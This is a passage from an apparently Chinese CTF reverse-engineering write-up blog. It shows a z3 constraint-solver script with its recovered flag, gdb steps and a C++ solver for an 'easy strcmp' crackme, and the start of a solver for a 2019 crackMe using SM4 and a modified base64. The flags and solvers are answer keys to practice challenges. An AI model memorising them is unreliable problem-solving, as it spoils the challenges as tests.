class="number">38</span>]+l[<span class="number">13</span>]-l[<span class="number">28</span>]+l[<span class="number">8</span>]+l[<span class="number">30</span>]-l[<span class="number">20</span>]-l[<span class="number">7</span>]-l[<span class="number">32</span>]+l[<span class="number">26</span>]+l[<span class="number">1</span>]-l[<span class="number">18</span>]+l[<span class="number">5</span>]+l[<span class="number">35</span>]-l[<span class="number">24</span>]-l[<span class="number">41</span>]+l[<span class="number">9</span>]-l[<span class="number">0</span>]-l[<span class="number">2</span>]-l[<span class="number">15</span>]-l[<span class="number">10</span>]+l[<span class="number">12</span>]-l[<span class="number">36</span>]+l[<span class="number">33</span>]-l[<span class="number">16</span>]-l[<span class="number">14</span>]-l[<span class="number">25</span>]-l[<span class="number">29</span>]-l[<span class="number">21</span>]+l[<span class="number">27</span>]+l[<span class="number">3</span>]-l[<span class="number">17</span>]==<span class="number">-945</span>)</span><br><span class="line">s.add(l[<span class="number">12</span>]-l[<span class="number">30</span>]-l[<span class="number">8</span>]+l[<span class="number">20</span>]-l[<span class="number">2</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]-l[<span class="number">0</span>]-l[<span class="number">19</span>]-l[<span class="number">28</span>]-l[<span class="number">7</span>]-l[<span class="number">11</span>]-l[<span class="number">33</span>]+l[<span class="number">4</span>]-l[<span class="number">23</span>]+l[<span class="number">10</span>]-l[<span class="number">41</span>]+l[<span class="number">39</span>]-l[<span class="number">32</span>]+l[<span class="number">27</span>]+l[<span class="number">18</span>]+l[<span class="number">15</span>]+l[<span class="number">34</span>]+l[<span class="number">13</span>]-l[<span class="number">40</span>]+l[<span class="number">29</span>]-l[<span class="number">6</span>]+l[<span class="number">37</span>]-l[<span class="number">14</span>]-l[<span class="number">16</span>]+l[<span class="number">38</span>]-l[<span class="number">26</span>]+l[<span class="number">17</span>]+l[<span class="number">31</span>]-l[<span class="number">22</span>]-l[<span class="number">35</span>]+l[<span class="number">5</span>]-l[<span class="number">1</span>]==<span class="number">-480</span>)</span><br><span class="line">s.add(l[<span class="number">36</span>]-l[<span class="number">11</span>]-l[<span class="number">34</span>]+l[<span class="number">8</span>]+l[<span class="number">0</span>]+l[<span class="number">15</span>]+l[<span class="number">28</span>]-l[<span class="number">39</span>]-l[<span class="number">32</span>]-l[<span class="number">2</span>]-l[<span class="number">27</span>]+l[<span class="number">22</span>]+l[<span class="number">16</span>]-l[<span class="number">30</span>]-l[<span class="number">3</span>]+l[<span class="number">31</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]+l[<span class="number">17</span>]-l[<span class="number">29</span>]-l[<span class="number">18</span>]+l[<span class="number">19</span>]-l[<span class="number">10</span>]+l[<span class="number">6</span>]-l[<span class="number">5</span>]-l[<span class="number">38</span>]-l[<span class="number">25</span>]-l[<span class="number">24</span>]+l[<span class="number">4</span>]+l[<span class="number">23</span>]+l[<span class="number">9</span>]+l[<span class="number">14</span>]+l[<span class="number">21</span>]-l[<span class="number">37</span>]+l[<span class="number">13</span>]-l[<span class="number">41</span>]-l[<span class="number">12</span>]+l[<span class="number">35</span>]==<span class="number">-213</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]-l[<span class="number">36</span>]-l[<span class="number">12</span>]+l[<span class="number">33</span>]-l[<span class="number">27</span>]-l[<span class="number">37</span>]-l[<span class="number">25</span>]+l[<span class="number">38</span>]+l[<span class="number">16</span>]-l[<span class="number">18</span>]+l[<span class="number">22</span>]-l[<span class="number">39</span>]+l[<span class="number">13</span>]-l[<span class="number">7</span>]-l[<span class="number">31</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">10</span>]-l[<span class="number">9</span>]-l[<span class="number">2</span>]-l[<span class="number">30</span>]-l[<span class="number">11</span>]+l[<span class="number">41</span>]-l[<span class="number">4</span>]+l[<span class="number">24</span>]+l[<span class="number">34</span>]+l[<span class="number">5</span>]+l[<span class="number">17</span>]+l[<span class="number">14</span>]+l[<span class="number">6</span>]+l[<span class="number">8</span>]-l[<span class="number">21</span>]-l[<span class="number">23</span>]+l[<span class="number">32</span>]-l[<span class="number">1</span>]-l[<span class="number">29</span>]-l[<span class="number">0</span>]+l[<span class="number">3</span>]==<span class="number">-386</span>)</span><br><span class="line">s.add(l[<span class="number">0</span>]+l[<span class="number">7</span>]-l[<span class="number">28</span>]-l[<span class="number">38</span>]+l[<span class="number">19</span>]+l[<span class="number">31</span>]-l[<span class="number">5</span>]+l[<span class="number">24</span>]-l[<span class="number">3</span>]+l[<span class="number">33</span>]-l[<span class="number">12</span>]-l[<span class="number">29</span>]+l[<span class="number">32</span>]+l[<span class="number">1</span>]-l[<span class="number">34</span>]-l[<span class="number">9</span>]-l[<span class="number">25</span>]+l[<span class="number">26</span>]-l[<span class="number">8</span>]+l[<span class="number">4</span>]-l[<span class="number">10</span>]+l[<span class="number">40</span>]-l[<span class="number">15</span>]-l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">36</span>]+l[<span class="number">14</span>]+l[<span class="number">41</span>]-l[<span class="number">35</span>]-l[<span class="number">13</span>]-l[<span class="number">17</span>]-l[<span class="number">21</span>]-l[<span class="number">18</span>]+l[<span class="number">39</span>]-l[<span class="number">2</span>]+l[<span class="number">20</span>]-l[<span class="number">23</span>]-l[<span class="number">22</span>]==<span class="number">-349</span>)</span><br><span class="line">s.add(l[<span class="number">10</span>]+l[<span class="number">22</span>]+l[<span class="number">21</span>]-l[<span class="number">0</span>]+l[<span class="number">15</span>]-l[<span class="number">6</span>]+l[<span class="number">20</span>]-l[<span class="number">29</span>]-l[<span class="number">30</span>]-l[<span class="number">33</span>]+l[<span class="number">19</span>]+l[<span class="number">23</span>]-l[<span class="number">28</span>]+l[<span class="number">41</span>]-l[<span class="number">27</span>]-l[<span class="number">12</span>]-l[<span class="number">37</span>]-l[<span class="number">32</span>]+l[<span class="number">34</span>]-l[<span class="number">36</span>]+l[<span class="number">3</span>]+l[<span class="number">1</span>]-l[<span class="number">13</span>]+l[<span class="number">18</span>]+l[<span class="number">14</span>]+l[<span class="number">9</span>]+l[<span class="number">7</span>]-l[<span class="number">39</span>]+l[<span class="number">8</span>]+l[<span class="number">2</span>]-l[<span class="number">31</span>]-l[<span class="number">5</span>]-l[<span class="number">40</span>]+l[<span class="number">38</span>]-l[<span class="number">26</span>]-l[<span class="number">4</span>]+l[<span class="number">16</span>]-l[<span class="number">25</span>]==<span class="number">98</span>)</span><br><span class="line">s.add(l[<span class="number">28</span>]+l[<span class="number">38</span>]+l[<span class="number">20</span>]+l[<span class="number">0</span>]-l[<span class="number">5</span>]-l[<span class="number">34</span>]-l[<span class="number">41</span>]+l[<span class="number">22</span>]-l[<span class="number">26</span>]+l[<span class="number">11</span>]+l[<span class="number">29</span>]+l[<span class="number">31</span>]-l[<span class="number">3</span>]-l[<span class="number">16</span>]+l[<span class="number">23</span>]+l[<span class="number">17</span>]-l[<span class="number">18</span>]+l[<span class="number">9</span>]-l[<span class="number">4</span>]-l[<span class="number">12</span>]-l[<span class="number">19</span>]-l[<span class="number">40</span>]-l[<span class="number">27</span>]+l[<span class="number">33</span>]+l[<span class="number">8</span>]-l[<span class="number">37</span>]+l[<span class="number">2</span>]+l[<span class="number">15</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]+l[<span class="number">10</span>]+l[<span class="number">35</span>]-l[<span class="number">1</span>]+l[<span class="number">30</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]-l[<span class="number">14</span>]-l[<span class="number">32</span>]==<span class="number">-412</span>)</span><br><span class="line">s.add(l[<span class="number">1</span>]-l[<span class="number">24</span>]-l[<span class="number">29</span>]+l[<span class="number">39</span>]+l[<span class="number">41</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]-l[<span class="number">19</span>]+l[<span class="number">6</span>]-l[<span class="number">37</span>]-l[<span class="number">22</span>]+l[<span class="number">32</span>]+l[<span class="number">21</span>]+l[<span class="number">28</span>]+l[<span class="number">36</span>]+l[<span class="number">4</span>]-l[<span class="number">17</span>]+l[<span class="number">20</span>]-l[<span class="number">13</span>]-l[<span class="number">35</span>]-l[<span class="number">5</span>]+l[<span class="number">33</span>]-l[<span class="number">27</span>]-l[<span class="number">30</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]-l[<span class="number">18</span>]+l[<span class="number">34</span>]-l[<span class="number">3</span>]-l[<span class="number">10</span>]-l[<span class="number">16</span>]-l[<span class="number">23</span>]-l[<span class="number">38</span>]+l[<span class="number">8</span>]-l[<span class="number">14</span>]-l[<span class="number">11</span>]-l[<span class="number">7</span>]+l[<span class="number">12</span>]==<span class="number">-95</span>)</span><br><span class="line">s.add(l[<span class="number">2</span>]-l[<span class="number">24</span>]+l[<span class="number">31</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]-l[<span class="number">6</span>]+l[<span class="number">7</span>]-l[<span class="number">1</span>]-l[<span class="number">22</span>]+l[<span class="number">8</span>]-l[<span class="number">23</span>]+l[<span class="number">40</span>]+l[<span class="number">20</span>]-l[<span class="number">38</span>]-l[<span class="number">11</span>]-l[<span class="number">14</span>]+l[<span class="number">18</span>]-l[<span class="number">36</span>]+l[<span class="number">15</span>]-l[<span class="number">4</span>]-l[<span class="number">41</span>]-l[<span class="number">12</span>]-l[<span class="number">34</span>]+l[<span class="number">32</span>]-l[<span class="number">35</span>]+l[<span class="number">17</span>]-l[<span class="number">21</span>]-l[<span class="number">10</span>]-l[<span class="number">29</span>]+l[<span class="number">39</span>]-l[<span class="number">16</span>]+l[<span class="number">27</span>]+l[<span class="number">26</span>]-l[<span class="number">3</span>]-l[<span class="number">5</span>]+l[<span class="number">13</span>]+l[<span class="number">25</span>]-l[<span class="number">28</span>]==<span class="number">-379</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]-l[<span class="number">17</span>]+l[<span class="number">31</span>]+l[<span class="number">14</span>]+l[<span class="number">6</span>]-l[<span class="number">12</span>]+l[<span class="number">16</span>]-l[<span class="number">8</span>]+l[<span class="number">27</span>]-l[<span class="number">13</span>]+l[<span class="number">41</span>]+l[<span class="number">2</span>]-l[<span class="number">7</span>]+l[<span class="number">32</span>]+l[<span class="number">1</span>]+l[<span class="number">25</span>]-l[<span class="number">9</span>]+l[<span class="number">37</span>]+l[<span class="number">34</span>]-l[<span class="number">18</span>]-l[<span class="number">40</span>]-l[<span class="number">11</span>]-l[<span class="number">10</span>]+l[<span class="number">38</span>]+l[<span class="number">21</span>]+l[<span class="number">3</span>]-l[<span class="number">0</span>]+l[<span class="number">24</span>]+l[<span class="number">15</span>]+l[<span class="number">23</span>]-l[<span class="number">20</span>]+l[<span class="number">26</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">28</span>]-l[<span class="number">5</span>]+l[<span class="number">39</span>]+l[<span class="number">35</span>]==<span class="number">861</span>)</span><br><span class="line">s.add(l[<span class="number">35</span>]+l[<span class="number">36</span>]-l[<span class="number">16</span>]-l[<span class="number">26</span>]-l[<span class="number">31</span>]+l[<span class="number">0</span>]+l[<span class="number">21</span>]-l[<span class="number">13</span>]+l[<span class="number">14</span>]+l[<span class="number">39</span>]+l[<span class="number">7</span>]+l[<span class="number">4</span>]+l[<span class="number">34</span>]+l[<span class="number">38</span>]+l[<span class="number">17</span>]+l[<span class="number">22</span>]+l[<span class="number">32</span>]+l[<span class="number">5</span>]+l[<span class="number">15</span>]+l[<span class="number">8</span>]-l[<span class="number">29</span>]+l[<span class="number">40</span>]+l[<span class="number">24</span>]+l[<span class="number">6</span>]+l[<span class="number">30</span>]-l[<span class="number">2</span>]+l[<span class="number">25</span>]+l[<span class="number">23</span>]+l[<span class="number">1</span>]+l[<span class="number">12</span>]+l[<span class="number">9</span>]-l[<span class="number">10</span>]-l[<span class="number">3</span>]-l[<span class="number">19</span>]+l[<span class="number">20</span>]-l[<span class="number">37</span>]-l[<span class="number">33</span>]-l[<span class="number">18</span>]==<span class="number">1169</span>)</span><br><span class="line">s.add(l[<span class="number">13</span>]+l[<span class="number">0</span>]-l[<span class="number">25</span>]-l[<span class="number">32</span>]-l[<span class="number">21</span>]-l[<span class="number">34</span>]-l[<span class="number">14</span>]-l[<span class="number">9</span>]-l[<span class="number">8</span>]-l[<span class="number">15</span>]-l[<span class="number">16</span>]+l[<span class="number">38</span>]-l[<span class="number">35</span>]-l[<span class="number">30</span>]-l[<span class="number">40</span>]-l[<span class="number">12</span>]+l[<span class="number">3</span>]-l[<span class="number">19</span>]+l[<span class="number">4</span>]-l[<span class="number">41</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]+l[<span class="number">37</span>]+l[<span class="number">17</span>]-l[<span class="number">1</span>]+l[<span class="number">26</span>]-l[<span class="number">39</span>]-l[<span class="number">10</span>]-l[<span class="number">33</span>]+l[<span class="number">5</span>]-l[<span class="number">27</span>]-l[<span class="number">23</span>]-l[<span class="number">24</span>]-l[<span class="number">7</span>]+l[<span class="number">31</span>]-l[<span class="number">28</span>]-l[<span class="number">18</span>]+l[<span class="number">6</span>]==<span class="number">-1236</span>)</span><br><span class="line">s.add(l[<span class="number">20</span>]+l[<span class="number">27</span>]-l[<span class="number">29</span>]-l[<span class="number">25</span>]-l[<span class="number">3</span>]+l[<span class="number">28</span>]-l[<span class="number">32</span>]-l[<span class="number">11</span>]+l[<span class="number">10</span>]+l[<span class="number">31</span>]+l[<span class="number">16</span>]+l[<span class="number">21</span>]-l[<span class="number">7</span>]+l[<span class="number">4</span>]-l[<span class="number">24</span>]-l[<span class="number">35</span>]+l[<span class="number">26</span>]+l[<span class="number">12</span>]-l[<span class="number">37</span>]+l[<span class="number">6</span>]+l[<span class="number">23</span>]+l[<span class="number">41</span>]-l[<span class="number">39</span>]-l[<span class="number">38</span>]+l[<span class="number">40</span>]-l[<span class="number">36</span>]+l[<span class="number">8</span>]-l[<span class="number">9</span>]-l[<span class="number">5</span>]-l[<span class="number">1</span>]-l[<span class="number">13</span>]-l[<span class="number">14</span>]+l[<span class="number">19</span>]+l[<span class="number">0</span>]-l[<span class="number">34</span>]-l[<span class="number">15</span>]+l[<span class="number">17</span>]+l[<span class="number">22</span>]==<span class="number">-114</span>)</span><br><span class="line">s.add(l[<span class="number">12</span>]-l[<span class="number">28</span>]-l[<span class="number">13</span>]-l[<span class="number">23</span>]-l[<span class="number">33</span>]+l[<span class="number">18</span>]+l[<span class="number">10</span>]+l[<span class="number">11</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]+l[<span class="number">41</span>]-l[<span class="number">16</span>]+l[<span class="number">39</span>]+l[<span class="number">34</span>]+l[<span class="number">32</span>]+l[<span class="number">37</span>]-l[<span class="number">38</span>]+l[<span class="number">20</span>]+l[<span class="number">6</span>]+l[<span class="number">7</span>]+l[<span class="number">31</span>]+l[<span class="number">5</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">15</span>]-l[<span class="number">24</span>]+l[<span class="number">17</span>]-l[<span class="number">3</span>]+l[<span class="number">1</span>]-l[<span class="number">35</span>]-l[<span class="number">9</span>]+l[<span class="number">30</span>]+l[<span class="number">25</span>]-l[<span class="number">0</span>]-l[<span class="number">8</span>]-l[<span class="number">14</span>]+l[<span class="number">26</span>]+l[<span class="number">21</span>]==<span class="number">659</span>)</span><br><span class="line">s.add(l[<span class="number">21</span>]-l[<span class="number">3</span>]+l[<span class="number">7</span>]-l[<span class="number">27</span>]+l[<span class="number">0</span>]-l[<span class="number">32</span>]-l[<span class="number">24</span>]-l[<span class="number">37</span>]+l[<span class="number">4</span>]-l[<span class="number">22</span>]+l[<span class="number">20</span>]-l[<span class="number">5</span>]-l[<span class="number">30</span>]-l[<span class="number">31</span>]-l[<span class="number">1</span>]+l[<span class="number">15</span>]+l[<span class="number">41</span>]+l[<span class="number">12</span>]+l[<span class="number">40</span>]+l[<span class="number">38</span>]-l[<span class="number">17</span>]-l[<span class="number">39</span>]+l[<span class="number">19</span>]-l[<span class="number">13</span>]+l[<span class="number">23</span>]+l[<span class="number">18</span>]-l[<span class="number">2</span>]+l[<span class="number">6</span>]-l[<span class="number">33</span>]-l[<span class="number">9</span>]+l[<span class="number">28</span>]+l[<span class="number">8</span>]-l[<span class="number">16</span>]-l[<span class="number">10</span>]-l[<span class="number">14</span>]+l[<span class="number">34</span>]+l[<span class="number">35</span>]-l[<span class="number">11</span>]==<span class="number">-430</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]-l[<span class="number">23</span>]-l[<span class="number">9</span>]-l[<span class="number">19</span>]+l[<span class="number">17</span>]+l[<span class="number">38</span>]-l[<span class="number">36</span>]-l[<span class="number">22</span>]-l[<span class="number">10</span>]+l[<span class="number">27</span>]-l[<span class="number">14</span>]-l[<span class="number">4</span>]+l[<span class="number">5</span>]+l[<span class="number">31</span>]+l[<span class="number">2</span>]+l[<span class="number">0</span>]-l[<span class="number">16</span>]-l[<span class="number">8</span>]-l[<span class="number">28</span>]+l[<span class="number">3</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]-l[<span class="number">33</span>]+l[<span class="number">13</span>]-l[<span class="number">32</span>]-l[<span class="number">35</span>]+l[<span class="number">26</span>]-l[<span class="number">20</span>]-l[<span class="number">41</span>]-l[<span class="number">30</span>]-l[<span class="number">12</span>]-l[<span class="number">7</span>]+l[<span class="number">37</span>]-l[<span class="number">39</span>]+l[<span class="number">15</span>]+l[<span class="number">18</span>]-l[<span class="number">29</span>]-l[<span class="number">21</span>]==<span class="number">-513</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">4</span>]-l[<span class="number">13</span>]-l[<span class="number">17</span>]-l[<span class="number">30</span>]+l[<span class="number">5</span>]-l[<span class="number">33</span>]-l[<span class="number">37</span>]-l[<span class="number">15</span>]-l[<span class="number">18</span>]+l[<span class="number">7</span>]+l[<span class="number">25</span>]-l[<span class="number">14</span>]+l[<span class="number">35</span>]+l[<span class="number">40</span>]+l[<span class="number">16</span>]+l[<span class="number">1</span>]+l[<span class="number">2</span>]+l[<span class="number">26</span>]-l[<span class="number">3</span>]-l[<span class="number">39</span>]-l[<span class="number">22</span>]+l[<span class="number">23</span>]-l[<span class="number">36</span>]-l[<span class="number">27</span>]-l[<span class="number">9</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]-l[<span class="number">0</span>]-l[<span class="number">31</span>]-l[<span class="number">20</span>]+l[<span class="number">12</span>]-l[<span class="number">8</span>]+l[<span class="number">29</span>]-l[<span class="number">11</span>]-l[<span class="number">34</span>]+l[<span class="number">21</span>]==<span class="number">-502</span>)</span><br><span class="line">s.add(l[<span class="number">30</span>]-l[<span class="number">31</span>]-l[<span class="number">36</span>]+l[<span class="number">3</span>]+l[<span class="number">9</span>]-l[<span class="number">40</span>]-l[<span class="number">33</span>]+l[<span class="number">25</span>]+l[<span class="number">39</span>]-l[<span class="number">26</span>]+l[<span class="number">23</span>]-l[<span class="number">0</span>]-l[<span class="number">29</span>]-l[<span class="number">32</span>]-l[<span class="number">4</span>]+l[<span class="number">37</span>]+l[<span class="number">28</span>]+l[<span class="number">21</span>]+l[<span class="number">17</span>]+l[<span class="number">2</span>]+l[<span class="number">24</span>]+l[<span class="number">6</span>]+l[<span class="number">5</span>]+l[<span class="number">8</span>]+l[<span class="number">16</span>]+l[<span class="number">27</span>]+l[<span class="number">19</span>]+l[<span class="number">12</span>]+l[<span class="number">20</span>]+l[<span class="number">41</span>]-l[<span class="number">22</span>]+l[<span class="number">15</span>]-l[<span class="number">11</span>]+l[<span class="number">34</span>]-l[<span class="number">18</span>]-l[<span class="number">38</span>]+l[<span class="number">1</span>]-l[<span class="number">14</span>]==<span class="number">853</span>)</span><br><span class="line">s.add(l[<span class="number">38</span>]-l[<span class="number">10</span>]+l[<span class="number">16</span>]+l[<span class="number">8</span>]+l[<span class="number">21</span>]-l[<span class="number">25</span>]+l[<span class="number">36</span>]-l[<span class="number">30</span>]+l[<span class="number">31</span>]-l[<span class="number">3</span>]+l[<span class="number">5</span>]-l[<span class="number">15</span>]+l[<span class="number">23</span>]-l[<span class="number">28</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">29</span>]+l[<span class="number">22</span>]-l[<span class="number">0</span>]-l[<span class="number">37</span>]-l[<span class="number">14</span>]-l[<span class="number">11</span>]+l[<span class="number">32</span>]+l[<span class="number">33</span>]-l[<span class="number">9</span>]+l[<span class="number">39</span>]+l[<span class="number">41</span>]-l[<span class="number">19</span>]-l[<span class="number">1</span>]+l[<span class="number">18</span>]-l[<span class="number">4</span>]-l[<span class="number">6</span>]+l[<span class="number">13</span>]+l[<span class="number">20</span>]-l[<span class="number">2</span>]-l[<span class="number">35</span>]-l[<span class="number">26</span>]+l[<span class="number">27</span>]==<span class="number">-28</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]+l[<span class="number">18</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">14</span>]-l[<span class="number">33</span>]+l[<span class="number">7</span>]-l[<span class="number">23</span>]-l[<span class="number">25</span>]+l[<span class="number">0</span>]-l[<span class="number">6</span>]-l[<span class="number">21</span>]-l[<span class="number">16</span>]+l[<span class="number">17</span>]-l[<span class="number">19</span>]-l[<span class="number">28</span>]-l[<span class="number">38</span>]-l[<span class="number">37</span>]+l[<span class="number">9</span>]+l[<span class="number">20</span>]-l[<span class="number">8</span>]-l[<span class="number">3</span>]+l[<span class="number">22</span>]-l[<span class="number">35</span>]-l[<span class="number">10</span>]-l[<span class="number">31</span>]-l[<span class="number">2</span>]+l[<span class="number">41</span>]-l[<span class="number">1</span>]-l[<span class="number">4</span>]+l[<span class="number">24</span>]-l[<span class="number">34</span>]+l[<span class="number">39</span>]+l[<span class="number">40</span>]+l[<span class="number">32</span>]-l[<span class="number">5</span>]+l[<span class="number">36</span>]-l[<span class="number">27</span>]==<span class="number">-529</span>)</span><br><span class="line">s.add(l[<span class="number">38</span>]+l[<span class="number">8</span>]+l[<span class="number">36</span>]+l[<span class="number">35</span>]-l[<span class="number">23</span>]-l[<span class="number">34</span>]+l[<span class="number">13</span>]-l[<span class="number">4</span>]-l[<span class="number">27</span>]-l[<span class="number">24</span>]+l[<span class="number">26</span>]+l[<span class="number">31</span>]-l[<span class="number">30</span>]-l[<span class="number">5</span>]-l[<span class="number">40</span>]+l[<span class="number">28</span>]-l[<span class="number">11</span>]-l[<span class="number">2</span>]-l[<span class="number">39</span>]+l[<span class="number">15</span>]+l[<span class="number">10</span>]-l[<span class="number">17</span>]+l[<span class="number">3</span>]+l[<span class="number">19</span>]+l[<span class="number">22</span>]+l[<span class="number">33</span>]+l[<span class="number">0</span>]+l[<span class="number">37</span>]+l[<span class="number">16</span>]-l[<span class="number">9</span>]-l[<span class="number">32</span>]+l[<span class="number">25</span>]-l[<span class="number">21</span>]-l[<span class="number">12</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]==<span class="number">-12</span>)</span><br><span class="line">s.add(l[<span class="number">6</span>]-l[<span class="number">30</span>]-l[<span class="number">20</span>]-l[<span class="number">27</span>]-l[<span class="number">14</span>]-l[<span class="number">39</span>]+l[<span class="number">41</span>]-l[<span class="number">33</span>]-l[<span class="number">0</span>]+l[<span class="number">25</span>]-l[<span class="number">32</span>]-l[<span class="number">3</span>]+l[<span class="number">26</span>]-l[<span class="number">12</span>]+l[<span class="number">8</span>]-l[<span class="number">35</span>]-l[<span class="number">24</span>]+l[<span class="number">15</span>]+l[<span class="number">9</span>]-l[<span class="number">4</span>]+l[<span class="number">13</span>]+l[<span class="number">36</span>]+l[<span class="number">34</span>]+l[<span class="number">1</span>]-l[<span class="number">28</span>]-l[<span class="number">21</span>]+l[<span class="number">18</span>]+l[<span class="number">23</span>]+l[<span class="number">29</span>]-l[<span class="number">10</span>]-l[<span class="number">38</span>]+l[<span class="number">22</span>]+l[<span class="number">37</span>]+l[<span class="number">5</span>]+l[<span class="number">19</span>]+l[<span class="number">7</span>]+l[<span class="number">16</span>]-l[<span class="number">31</span>]==<span class="number">81</span>)</span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        a.append(s.model()[i].as_long())</span><br><span class="line">print(bytes(a))</span><br></pre></td></tr></table></figure>

<p>flag{A_l0ng_10NG_eqU4Ti0n_1s_E4Sy_W1Th_z3}</p>
<p>感觉实际解的话使用栈模型看括号似乎比较容易。</p>
<p>js才是世界上最好的语言。。</p>
<p>参考资料 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39542714/article/details/106834909">BUUCTF–equation_Hk_Mayfly的博客-CSDN博客</a></p>
<h2 id="rev-easy-strcmp"><a href="#rev-easy-strcmp" class="headerlink" title="[rev]easy strcmp"></a>[rev]easy strcmp</h2><ol>
<li><p>使用IDA打开，发现虚假的main函数</p>
</li>
<li><p>进行调试，在puts下断点，找到主函数位于0x55555555481e附近</p>
</li>
<li><p>反编译程序，查看源码</p>
</li>
<li><p>在puts之前一些地方下断点，重新调试</p>
<p>强制gdb反汇编某个地方</p>
<p>当gdb接收一个参数时，gdb会尝试反汇编包含那个地址的函数</p>
<p>当gdb接受两个参数时，gdb会尝试反汇编那个区间的代码</p>
<p>disassambly start,end</p>
<p>disassambly start,+len</p>
</li>
<li><p>发现程序主逻辑：把用户输入加上一些偏移量与加密字符串比较c++</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &quot;defs.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> fflag[] = <span class="string">&quot;zer0pts&#123;********CENSORED********&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> diff[] = &#123;<span class="number">0</span>, <span class="number">0x410A4335494A0942</span>ll, <span class="number">0x0B0EF2F50BE619F0</span>ll, <span class="number">0x4F0A3A064A35282B</span>ll&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        *((<span class="keyword">uint64_t</span> *)fflag+i)+=diff[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;fflag&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="rev-安洵杯-2019-crackMe"><a href="#rev-安洵杯-2019-crackMe" class="headerlink" title="[rev][安洵杯 2019]crackMe"></a>[rev][安洵杯 2019]crackMe</h2><ol>
<li><p>程序使用了一些异常处理的手法</p>
</li>
<li><p>base64表进行了变换</p>
</li>
<li><p>加密4个6位字符都+24了</p>
</li>
<li><p>类base64编码之前还有个变换</p>
</li>
<li><p>对于输入的变换：使用了SM4国密算法</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span 